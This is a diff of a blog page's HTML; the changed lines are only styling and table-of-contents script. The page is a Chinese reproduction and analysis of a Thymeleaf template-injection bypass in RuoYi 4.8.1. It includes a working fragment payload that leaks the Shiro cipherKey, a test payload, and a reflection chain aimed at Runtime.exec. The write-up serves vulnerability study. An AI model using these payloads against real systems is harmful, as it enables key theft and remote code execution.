@@ -13,7 +13,7 @@ https://mp.weixin.qq.com/s/4yi0UOTgBCsGK6J8qSz8tQ
 某依最新版本稳定4.8.1 RCE (Thymeleaf模板注入绕过)">
 <meta name="author" content="map[name:xvsf]">
 <link rel="canonical" href="https://xvshifu.github.io/xvsf/posts/%E8%8B%A5%E4%BE%9D4.8.1%E6%BC%8F%E6%B4%9E-ssti%E7%BB%95%E8%BF%87%E8%8E%B7%E5%8F%96shirokey%E8%87%B3rce/">
-<link crossorigin="anonymous" href="/xvsf/assets/css/stylesheet.107842b3d7a50993f400a2f9d591dd6f46830b1393c74b51d61e8545ebbb93dc.css" integrity="sha256-EHhCs9elCZP0AKL51ZHdb0aDCxOTx0tR1h6FReu7k9w=" rel="preload stylesheet" as="style">
+<link crossorigin="anonymous" href="/xvsf/assets/css/stylesheet.070c3d495fee0ddd7e9422e47ae72235cec36eed466deee6c2ab5060371fa638.css" integrity="sha256-Bww9SV/uDd1&#43;lCLkeuciNc7Dbu1Gbe7mwqtQYDcfpjg=" rel="preload stylesheet" as="style">
 <link rel="icon" href="https://xvshifu.github.io/xvsf/img/2.jpg">
 <link rel="icon" type="image/png" sizes="16x16" href="https://xvshifu.github.io/xvsf/favicon-16x16.png">
 <link rel="icon" type="image/png" sizes="32x32" href="https://xvshifu.github.io/xvsf/favicon-32x32.png">
@@ -84,7 +84,9 @@ https://mp.weixin.qq.com/s/4yi0UOTgBCsGK6J8qSz8tQ
 
 <div id="lightbox-overlay" class="lightbox-overlay" aria-hidden="true">
     <button class="lightbox-close" aria-label="关闭">&times;</button>
+    <button class="lightbox-nav lightbox-prev" aria-label="上一张">‹</button>
     <img class="lightbox-img" alt="">
+    <button class="lightbox-nav lightbox-next" aria-label="下一张">›</button>
 </div>
 
 
@@ -128,8 +130,7 @@ https://mp.weixin.qq.com/s/4yi0UOTgBCsGK6J8qSz8tQ
     <meta property="article:modified_time" content="2026-01-07T10:00:00+08:00">
     <meta property="article:tag" content="企业系统">
     <meta property="article:tag" content="漏洞复现">
-    <meta property="article:tag" content="SSTI">
-      <meta property="og:image" content="https://xvshifu.github.io/xvsf/img/1.png">
+    <meta property="article:tag" content="SSTI"><meta property="og:image" content="https://xvshifu.github.io/xvsf/img/1.png">
 <meta name="twitter:card" content="summary_large_image">
 <meta name="twitter:image" content="https://xvshifu.github.io/xvsf/img/1.png">
 <meta name="twitter:title" content="若依4.8.1漏洞 SSTI绕过获取ShiroKey至RCE">
@@ -311,124 +312,119 @@ https://mp.weixin.qq.com/s/4yi0UOTgBCsGK6J8qSz8tQ
 <script>
     let activeElement;
     let elements;
-    
-    document.addEventListener('DOMContentLoaded', function (event) {
+    let tocLinks;
+    const visibleHeadings = new Set();
+
+    document.addEventListener('DOMContentLoaded', function () {
         checkTocPosition();
-    
-        elements = document.querySelectorAll('h1[id],h2[id],h3[id],h4[id],h5[id],h6[id]');
+
+        elements = Array.from(document.querySelectorAll('h1[id],h2[id],h3[id],h4[id],h5[id],h6[id]'));
+        tocLinks = new Map(Array.from(document.querySelectorAll('.toc .inner a[href^="#"]')).map(link => [link.getAttribute('href').toLowerCase(), link]));
+
         if (elements.length > 0) {
-            
-            activeElement = elements[0];
-            const id = encodeURI(activeElement.getAttribute('id')).toLowerCase();
-            document.querySelector(`.inner ul li a[href="#${id}"]`).classList.add('active');
+            setActiveHeading(elements[0]);
+            observeHeadings();
         }
-    
-        
+
         const topLink = document.getElementById('top-link');
         if (topLink) {
             topLink.addEventListener('click', (event) => {
-                
                 event.preventDefault();
-    
-                
                 window.scrollTo({ top: 0, behavior: 'smooth' });
             });
         }
     }, false);
-    
-    window.addEventListener('resize', function(event) {
+
+    window.addEventListener('resize', function () {
         checkTocPosition();
     }, false);
-    
-    window.addEventListener('scroll', () => {
-        
-        const scrollPosition = window.pageYOffset || document.documentElement.scrollTop;
-    
-        
-        if (scrollPosition === 0) {
-            return;
-        }
-    
-        
-        if (elements && elements.length > 0) {
-            
-            activeElement = Array.from(elements).find((element) => {
-                if ((getOffsetTop(element) - scrollPosition) > 0 && 
-                    (getOffsetTop(element) - scrollPosition) < window.innerHeight / 2) {
-                    return element;
-                }
-            }) || activeElement;
-    
-            elements.forEach(element => {
-                const id = encodeURI(element.getAttribute('id')).toLowerCase();
-                const tocLink = document.querySelector(`.inner ul li a[href="#${id}"]`);
-                if (element === activeElement){
-                    tocLink.classList.add('active');
-    
-                    
-                    const tocContainer = document.querySelector('.toc .inner');
-                    const linkOffsetTop = tocLink.offsetTop;
-                    const containerHeight = tocContainer.clientHeight;
-                    const linkHeight = tocLink.clientHeight;
-    
-                    
-                    const scrollPosition = linkOffsetTop - (containerHeight / 2) + (linkHeight / 2);
-                    tocContainer.scrollTo({ top: scrollPosition, behavior: 'smooth' });
-                } else {
-                    tocLink.classList.remove('active');
-                }
-            });
-        }
-    }, false);
-    
+
     const main = parseInt(getComputedStyle(document.body).getPropertyValue('--article-width'), 10);
     const toc = parseInt(getComputedStyle(document.body).getPropertyValue('--toc-width'), 10);
     const gap = parseInt(getComputedStyle(document.body).getPropertyValue('--gap'), 10);
-    
+
+    function observeHeadings() {
+        const observer = new IntersectionObserver((entries) => {
+            entries.forEach(entry => {
+                if (entry.isIntersecting) {
+                    visibleHeadings.add(entry.target);
+                } else {
+                    visibleHeadings.delete(entry.target);
+                }
+            });
+
+            const visible = elements.find(element => visibleHeadings.has(element));
+            if (visible) {
+                setActiveHeading(visible);
+                return;
+            }
+
+            const passed = elements.filter(element => element.getBoundingClientRect().top <= getHeaderOffset());
+            setActiveHeading(passed[passed.length - 1] || elements[0]);
+        }, {
+            rootMargin: `-${getHeaderOffset()}px 0px -55% 0px`,
+            threshold: [0, 1]
+        });
+
+        elements.forEach(element => observer.observe(element));
+    }
+
+    function setActiveHeading(element) {
+        if (!element || element === activeElement) return;
+        activeElement = element;
+
+        tocLinks.forEach(link => link.classList.remove('active'));
+        const id = `#${encodeURI(element.getAttribute('id')).toLowerCase()}`;
+        const tocLink = tocLinks.get(id);
+        if (!tocLink) return;
+
+        tocLink.classList.add('active');
+
+        const tocContainer = document.querySelector('.toc .inner');
+        if (tocContainer) {
+            const scrollPosition = tocLink.offsetTop - (tocContainer.clientHeight / 2) + (tocLink.clientHeight / 2);
+            tocContainer.scrollTo({ top: scrollPosition, behavior: 'smooth' });
+        }
+    }
+
     function checkTocPosition() {
         const width = document.body.scrollWidth;
-    
+
         if (width - main - (toc * 2) - (gap * 4) > 0) {
             document.getElementById("toc-container").classList.add("wide");
         } else {
             document.getElementById("toc-container").classList.remove("wide");
         }
     }
-    
-    function getOffsetTop(element) {
-        if (!element.getClientRects().length) {
-            return 0;
-        }
-        let rect = element.getBoundingClientRect();
-        let win = element.ownerDocument.defaultView;
-        return rect.top + win.pageYOffset;   
+
+    function getHeaderOffset() {
+        return parseInt(getComputedStyle(document.body).getPropertyValue('--header-height'), 10) + 16;
     }
-    
 </script>
 <h1 id="参考文章">参考文章：<a hidden class="anchor" aria-hidden="true" href="#参考文章">#</a></h1>
 <p>若依最新版本4.8.1漏洞 SSTI绕过获取ShiroKey至RCE(全JAVA版本绕过，附带POC)</p>
-<p><a href="https://mp.weixin.qq.com/s/4yi0UOTgBCsGK6J8qSz8tQ">https://mp.weixin.qq.com/s/4yi0UOTgBCsGK6J8qSz8tQ</a></p>
+<p><a href="https://mp.weixin.qq.com/s/4yi0UOTgBCsGK6J8qSz8tQ" target="_blank" rel="noopener noreferrer">https://mp.weixin.qq.com/s/4yi0UOTgBCsGK6J8qSz8tQ</a></p>
 <p>某依最新版本稳定4.8.1 RCE (Thymeleaf模板注入绕过)</p>
-<p><a href="https://mp.weixin.qq.com/s/uxvGbO4biM87DVSXA_ZlQw">https://mp.weixin.qq.com/s/uxvGbO4biM87DVSXA_ZlQw</a></p>
+<p><a href="https://mp.weixin.qq.com/s/uxvGbO4biM87DVSXA_ZlQw" target="_blank" rel="noopener noreferrer">https://mp.weixin.qq.com/s/uxvGbO4biM87DVSXA_ZlQw</a></p>
 <h1 id="环境搭建">环境搭建<a hidden class="anchor" aria-hidden="true" href="#环境搭建">#</a></h1>
 <p>源码：</p>
-<p><a href="https://github.com/yangzongzhuan/RuoYi/releases">https://github.com/yangzongzhuan/RuoYi/releases</a></p>
+<p><a href="https://github.com/yangzongzhuan/RuoYi/releases" target="_blank" rel="noopener noreferrer">https://github.com/yangzongzhuan/RuoYi/releases</a></p>
 <p>参考文档：RuoYi-4.8.1\doc\若依环境使用手册.docx</p>
 <p>导入数据库</p>
 <p><img decoding="async" height="875" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202603071144229.png" style="max-width: 100%; height: auto; aspect-ratio: 822 / 875;" width="822"></p>
 <p>修改数据库配置：RuoYi-4.8.1\ruoyi-admin\src\main\resources\application-druid.yml</p>
-<p><img decoding="async" height="1528" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202603071144591.png" style="max-width: 100%; height: auto; aspect-ratio: 2560 / 1528;" width="2560"></p>
+<p><img decoding="async" height="1528" loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202603071144591.png" style="max-width: 100%; height: auto; aspect-ratio: 2560 / 1528;" width="2560"></p>
 <p>服务器端口：RuoYi-4.8.1\ruoyi-admin\src\main\resources\application.yml</p>
-<p><img decoding="async" height="1528" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202603071144282.png" style="max-width: 100%; height: auto; aspect-ratio: 2560 / 1528;" width="2560"></p>
+<p><img decoding="async" height="1528" loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202603071144282.png" style="max-width: 100%; height: auto; aspect-ratio: 2560 / 1528;" width="2560"></p>
 <p>启动若依</p>
-<p><img decoding="async" height="1528" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202603071145405.png" style="max-width: 100%; height: auto; aspect-ratio: 2560 / 1528;" width="2560">
-<img decoding="async" height="1528" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202603071145541.png" style="max-width: 100%; height: auto; aspect-ratio: 2560 / 1528;" width="2560"></p>
+<p><img decoding="async" height="1528" loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202603071145405.png" style="max-width: 100%; height: auto; aspect-ratio: 2560 / 1528;" width="2560">
+<img decoding="async" height="1528" loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202603071145541.png" style="max-width: 100%; height: auto; aspect-ratio: 2560 / 1528;" width="2560"></p>
 <p>默认密码为 admin/admin123</p>
-<p><img decoding="async" height="1528" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202603071145857.png" style="max-width: 100%; height: auto; aspect-ratio: 2560 / 1528;" width="2560">
-<img decoding="async" height="1528" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202603071144394.png" style="max-width: 100%; height: auto; aspect-ratio: 2560 / 1528;" width="2560"></p>
+<p><img decoding="async" height="1528" loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202603071145857.png" style="max-width: 100%; height: auto; aspect-ratio: 2560 / 1528;" width="2560">
+<img decoding="async" height="1528" loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202603071144394.png" style="max-width: 100%; height: auto; aspect-ratio: 2560 / 1528;" width="2560"></p>
 <h1 id="漏洞复现">漏洞复现<a hidden class="anchor" aria-hidden="true" href="#漏洞复现">#</a></h1>
 <p>POC：</p>
-<div class="code-block-container" id="code-1779933344390394400" data-expanded="false" role="region" aria-labelledby="btn-code-1779933344390394400">
+<div class="code-block-container" id="code-1779947699570668300" data-expanded="false" role="region" aria-labelledby="btn-code-1779947699570668300">
     <div class="code-header">
         <div class="mac-buttons">
             <span class="mac-button red"></span>
@@ -440,12 +436,12 @@ https://mp.weixin.qq.com/s/4yi0UOTgBCsGK6J8qSz8tQ
             <button class="copy-btn" title="Copy" aria-label="复制代码">
                 <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path></svg>
             </button>
-            <button class="toggle-btn" id="btn-code-1779933344390394400" title="Toggle" aria-expanded="false" aria-controls="code-1779933344390394400" aria-label="展开或折叠代码块">
+            <button class="toggle-btn" id="btn-code-1779947699570668300" title="Toggle" aria-expanded="false" aria-controls="code-1779947699570668300" aria-label="展开或折叠代码块">
                 <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-chevron-down"><polyline points="6 9 12 15 18 9"></polyline></svg>
             </button>
         </div>
     </div>
-    <div class="code-content" id="code-1779933344390394400-content"><div class="highlight"><div class="chroma">
+    <div class="code-content" id="code-1779947699570668300-content"><div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt" id="1"><span class="lnlinks"> 1</span>
 </span><span class="lnt" id="2"><span class="lnlinks"> 2</span>
@@ -489,8 +485,8 @@ https://mp.weixin.qq.com/s/4yi0UOTgBCsGK6J8qSz8tQ
 </span></span><span class="line"><span class="cl">fragment=__|$${#response.getWriter().print(&#39;&#39;.getClass().forName(&#39;java.util.Base64&#39;).getMethod(&#39;getEncoder&#39;).invoke(null).encodeToString(@securityManager.rememberMeManager.cipherKey))}|__::.x</span></span></code></pre></td></tr></table>
 </div>
 </div></div>
-</div><p><img decoding="async" height="1528" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202603071144864.png" style="max-width: 100%; height: auto; aspect-ratio: 2560 / 1528;" width="2560"></p>
-<div class="code-block-container" id="code-1779933344394726800" data-expanded="false" role="region" aria-labelledby="btn-code-1779933344394726800">
+</div><p><img decoding="async" height="1528" loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202603071144864.png" style="max-width: 100%; height: auto; aspect-ratio: 2560 / 1528;" width="2560"></p>
+<div class="code-block-container" id="code-1779947699571671000" data-expanded="false" role="region" aria-labelledby="btn-code-1779947699571671000">
     <div class="code-header">
         <div class="mac-buttons">
             <span class="mac-button red"></span>
@@ -502,12 +498,12 @@ https://mp.weixin.qq.com/s/4yi0UOTgBCsGK6J8qSz8tQ
             <button class="copy-btn" title="Copy" aria-label="复制代码">
                 <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path></svg>
             </button>
-            <button class="toggle-btn" id="btn-code-1779933344394726800" title="Toggle" aria-expanded="false" aria-controls="code-1779933344394726800" aria-label="展开或折叠代码块">
+            <button class="toggle-btn" id="btn-code-1779947699571671000" title="Toggle" aria-expanded="false" aria-controls="code-1779947699571671000" aria-label="展开或折叠代码块">
                 <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-chevron-down"><polyline points="6 9 12 15 18 9"></polyline></svg>
             </button>
         </div>
     </div>
-    <div class="code-content" id="code-1779933344394726800-content"><div class="highlight"><div class="chroma">
+    <div class="code-content" id="code-1779947699571671000-content"><div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt" id="1"><span class="lnlinks">1</span>
 </span><span class="lnt" id="2"><span class="lnlinks">2</span>
@@ -528,12 +524,12 @@ https://mp.weixin.qq.com/s/4yi0UOTgBCsGK6J8qSz8tQ
 </div>
 </div></div>
 </div><p>shiro 利用</p>
-<p><img decoding="async" height="1247" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202603071144153.png" style="max-width: 100%; height: auto; aspect-ratio: 1504 / 1247;" width="1504"></p>
-<p><img decoding="async" height="1247" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202603071144669.png" style="max-width: 100%; height: auto; aspect-ratio: 1504 / 1247;" width="1504"></p>
+<p><img decoding="async" height="1247" loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202603071144153.png" style="max-width: 100%; height: auto; aspect-ratio: 1504 / 1247;" width="1504"></p>
+<p><img decoding="async" height="1247" loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202603071144669.png" style="max-width: 100%; height: auto; aspect-ratio: 1504 / 1247;" width="1504"></p>
 <h1 id="漏洞分析">漏洞分析<a hidden class="anchor" aria-hidden="true" href="#漏洞分析">#</a></h1>
 <h2 id="漏洞点">漏洞点<a hidden class="anchor" aria-hidden="true" href="#漏洞点">#</a></h2>
 <p><code>RuoYi-4.8.1\ruoyi-admin\src\main\java\com\ruoyi\web\controller\monitor\CacheController.java</code></p>
-<div class="code-block-container" id="code-1779933344394916300" data-expanded="false" role="region" aria-labelledby="btn-code-1779933344394916300">
+<div class="code-block-container" id="code-1779947699572187300" data-expanded="false" role="region" aria-labelledby="btn-code-1779947699572187300">
     <div class="code-header">
         <div class="mac-buttons">
             <span class="mac-button red"></span>
@@ -545,12 +541,12 @@ https://mp.weixin.qq.com/s/4yi0UOTgBCsGK6J8qSz8tQ
             <button class="copy-btn" title="Copy" aria-label="复制代码">
                 <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path></svg>
             </button>
-            <button class="toggle-btn" id="btn-code-1779933344394916300" title="Toggle" aria-expanded="false" aria-controls="code-1779933344394916300" aria-label="展开或折叠代码块">
+            <button class="toggle-btn" id="btn-code-1779947699572187300" title="Toggle" aria-expanded="false" aria-controls="code-1779947699572187300" aria-label="展开或折叠代码块">
                 <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-chevron-down"><polyline points="6 9 12 15 18 9"></polyline></svg>
             </button>
         </div>
     </div>
-    <div class="code-content" id="code-1779933344394916300-content"><div class="highlight"><div class="chroma">
+    <div class="code-content" id="code-1779947699572187300-content"><div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt" id="1"><span class="lnlinks">1</span>
 </span><span class="lnt" id="2"><span class="lnlinks">2</span>
@@ -570,12 +566,12 @@ https://mp.weixin.qq.com/s/4yi0UOTgBCsGK6J8qSz8tQ
 </span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span></span></span></code></pre></td></tr></table>
 </div>
 </div></div>
-</div><p><img decoding="async" height="1528" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202603071144220.png" style="max-width: 100%; height: auto; aspect-ratio: 2560 / 1528;" width="2560"></p>
+</div><p><img decoding="async" height="1528" loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202603071144220.png" style="max-width: 100%; height: auto; aspect-ratio: 2560 / 1528;" width="2560"></p>
 <p>用户在 <!-- raw HTML omitted -->http://localhost:80/monitor/cache/getNames 接口处 POST 传入的 <!-- raw HTML omitted --><code>&lt;font style=&quot;color:#080808;background-color:#ffffff;&quot;&gt;fragment&lt;/font&gt;</code><!-- raw HTML omitted --> 参数，被直接拼接到 Thymeleaf 模板路径中，<!-- raw HTML omitted --><code>&lt;font style=&quot;color:#080808;background-color:#ffffff;&quot;&gt;return&lt;/font&gt;</code><!-- raw HTML omitted -->返回结果使用 Thymeleaf 片段语法(::)拼接<!-- raw HTML omitted --></p>
 <blockquote>
 <p>Thymeleaf片段语法格式为：<code>前缀 + &quot;/cache::&quot; + 片段名</code></p>
 </blockquote>
-<div class="code-block-container" id="code-1779933344396339500" data-expanded="false" role="region" aria-labelledby="btn-code-1779933344396339500">
+<div class="code-block-container" id="code-1779947699573181600" data-expanded="false" role="region" aria-labelledby="btn-code-1779947699573181600">
     <div class="code-header">
         <div class="mac-buttons">
             <span class="mac-button red"></span>
@@ -587,12 +583,12 @@ https://mp.weixin.qq.com/s/4yi0UOTgBCsGK6J8qSz8tQ
             <button class="copy-btn" title="Copy" aria-label="复制代码">
                 <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path></svg>
             </button>
-            <button class="toggle-btn" id="btn-code-1779933344396339500" title="Toggle" aria-expanded="false" aria-controls="code-1779933344396339500" aria-label="展开或折叠代码块">
+            <button class="toggle-btn" id="btn-code-1779947699573181600" title="Toggle" aria-expanded="false" aria-controls="code-1779947699573181600" aria-label="展开或折叠代码块">
                 <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-chevron-down"><polyline points="6 9 12 15 18 9"></polyline></svg>
             </button>
         </div>
     </div>
-    <div class="code-content" id="code-1779933344396339500-content"><div class="highlight"><div class="chroma">
+    <div class="code-content" id="code-1779947699573181600-content"><div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt" id="1"><span class="lnlinks">1</span>
 </span></code></pre></td>
@@ -600,10 +596,10 @@ https://mp.weixin.qq.com/s/4yi0UOTgBCsGK6J8qSz8tQ
 <pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="k">return</span><span class="w"> </span><span class="n">prefix</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="s">&#34;/cache::&#34;</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">fragment</span><span class="p">;</span></span></span></code></pre></td></tr></table>
 </div>
 </div></div>
-</div><p><img decoding="async" height="1528" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202603071144449.png" style="max-width: 100%; height: auto; aspect-ratio: 2560 / 1528;" width="2560"></p>
+</div><p><img decoding="async" height="1528" loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202603071144449.png" style="max-width: 100%; height: auto; aspect-ratio: 2560 / 1528;" width="2560"></p>
 <p>攻击者通过 fragment 参数注入 SpEL 表达式，Thymeleaf 在解析视图名时会自动执行</p>
 <p><!-- raw HTML omitted -->通过<!-- raw HTML omitted --><code>&lt;font style=&quot;color:rgba(0, 0, 0, 0.9);&quot;&gt;__|$${表达式}|__::.x&lt;/font&gt;</code><!-- raw HTML omitted --> 该格式可进行绕过，先来试验一下：<!-- raw HTML omitted --></p>
-<div class="code-block-container" id="code-1779933344397376900" data-expanded="false" role="region" aria-labelledby="btn-code-1779933344397376900">
+<div class="code-block-container" id="code-1779947699573678200" data-expanded="false" role="region" aria-labelledby="btn-code-1779947699573678200">
     <div class="code-header">
         <div class="mac-buttons">
             <span class="mac-button red"></span>
@@ -615,12 +611,12 @@ https://mp.weixin.qq.com/s/4yi0UOTgBCsGK6J8qSz8tQ
             <button class="copy-btn" title="Copy" aria-label="复制代码">
                 <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path></svg>
             </button>
-            <button class="toggle-btn" id="btn-code-1779933344397376900" title="Toggle" aria-expanded="false" aria-controls="code-1779933344397376900" aria-label="展开或折叠代码块">
+            <button class="toggle-btn" id="btn-code-1779947699573678200" title="Toggle" aria-expanded="false" aria-controls="code-1779947699573678200" aria-label="展开或折叠代码块">
                 <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-chevron-down"><polyline points="6 9 12 15 18 9"></polyline></svg>
             </button>
         </div>
     </div>
-    <div class="code-content" id="code-1779933344397376900-content"><div class="highlight"><div class="chroma">
+    <div class="code-content" id="code-1779947699573678200-content"><div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt" id="1"><span class="lnlinks">1</span>
 </span></code></pre></td>
@@ -628,8 +624,8 @@ https://mp.weixin.qq.com/s/4yi0UOTgBCsGK6J8qSz8tQ
 <pre tabindex="0" class="chroma"><code class="language-plain" data-lang="plain"><span class="line"><span class="cl">fragment=__|$${#response.getWriter().print(&#39;111&#39;)}|__::.x</span></span></code></pre></td></tr></table>
 </div>
 </div></div>
-</div><p><img decoding="async" height="1528" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202603071145609.png" style="max-width: 100%; height: auto; aspect-ratio: 2560 / 1528;" width="2560"></p>
-<p><strong>关于 payload 的构造可以看 <strong><a href="https://mp.weixin.qq.com/s/4yi0UOTgBCsGK6J8qSz8tQ"><strong>https://mp.weixin.qq.com/s/4yi0UOTgBCsGK6J8qSz8tQ</strong></a></strong> 这篇文章，讲解十分详细</strong></p>
+</div><p><img decoding="async" height="1528" loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202603071145609.png" style="max-width: 100%; height: auto; aspect-ratio: 2560 / 1528;" width="2560"></p>
+<p><strong>关于 payload 的构造可以看 <strong><a href="https://mp.weixin.qq.com/s/4yi0UOTgBCsGK6J8qSz8tQ" target="_blank" rel="noopener noreferrer"><strong>https://mp.weixin.qq.com/s/4yi0UOTgBCsGK6J8qSz8tQ</strong></a></strong> 这篇文章，讲解十分详细</strong></p>
 <blockquote>
 <p><strong><!-- raw HTML omitted -->最新版本中禁用的语法<!-- raw HTML omitted --></strong><!-- raw HTML omitted -->：<!-- raw HTML omitted --></p>
 <ul>
@@ -643,7 +639,7 @@ https://mp.weixin.qq.com/s/4yi0UOTgBCsGK6J8qSz8tQ
 </blockquote>
 <p><!-- raw HTML omitted -->获取SecurityManager → 获取Class → 获取ClassLoader → 加载Runtime类 → 获取getRuntime方法 → 获取Runtime实例 → 获取exec方法 → 执行系统命令<!-- raw HTML omitted --></p>
 <p><!-- raw HTML omitted -->那么构造出如下利用链：<!-- raw HTML omitted --></p>
-<div class="code-block-container" id="code-1779933344398070000" data-expanded="false" role="region" aria-labelledby="btn-code-1779933344398070000">
+<div class="code-block-container" id="code-1779947699574670700" data-expanded="false" role="region" aria-labelledby="btn-code-1779947699574670700">
     <div class="code-header">
         <div class="mac-buttons">
             <span class="mac-button red"></span>
@@ -655,12 +651,12 @@ https://mp.weixin.qq.com/s/4yi0UOTgBCsGK6J8qSz8tQ
             <button class="copy-btn" title="Copy" aria-label="复制代码">
                 <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path></svg>
             </button>
-            <button class="toggle-btn" id="btn-code-1779933344398070000" title="Toggle" aria-expanded="false" aria-controls="code-1779933344398070000" aria-label="展开或折叠代码块">
+            <button class="toggle-btn" id="btn-code-1779947699574670700" title="Toggle" aria-expanded="false" aria-controls="code-1779947699574670700" aria-label="展开或折叠代码块">
                 <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-chevron-down"><polyline points="6 9 12 15 18 9"></polyline></svg>
             </button>
         </div>
     </div>
-    <div class="code-content" id="code-1779933344398070000-content"><div class="highlight"><div class="chroma">
+    <div class="code-content" id="code-1779947699574670700-content"><div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt" id="1"><span class="lnlinks">1</span>
 </span></code></pre></td>
@@ -669,9 +665,9 @@ https://mp.weixin.qq.com/s/4yi0UOTgBCsGK6J8qSz8tQ
 </div>
 </div></div>
 </div><p><!-- raw HTML omitted -->直接500报错，那么为什么这个链看起来是正常的却不能执行？<!-- raw HTML omitted --></p>
-<p><img decoding="async" height="1528" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202603071144224.png" style="max-width: 100%; height: auto; aspect-ratio: 2560 / 1528;" width="2560"><!-- raw HTML omitted --><br>
